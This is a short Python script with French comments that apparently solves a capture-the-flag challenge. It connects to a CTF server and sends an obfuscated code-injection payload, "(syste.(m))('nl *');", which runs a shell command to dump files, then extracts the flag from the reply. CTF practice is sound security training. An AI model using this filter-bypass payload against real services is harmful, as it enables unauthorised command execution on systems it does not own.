from socket import socket

# Connexion au challenge
sock = socket()
sock.connect(("ctf.esnhack.fr", 3005))

# Envoie de la payload
sock.send("(syste.(m))('nl *');".encode())
sock.send("\n".encode())

# Réception du résultat et parse pour récupérer que le flag
donnee = sock.recv(1024).decode()
donneeFichier = sock.recv(1024).decode()

indiceDeb = donneeFichier.find('BDE')
indiceFin = donneeFichier.find('}";')

print(donneeFichier[indiceDeb:indiceFin+1])
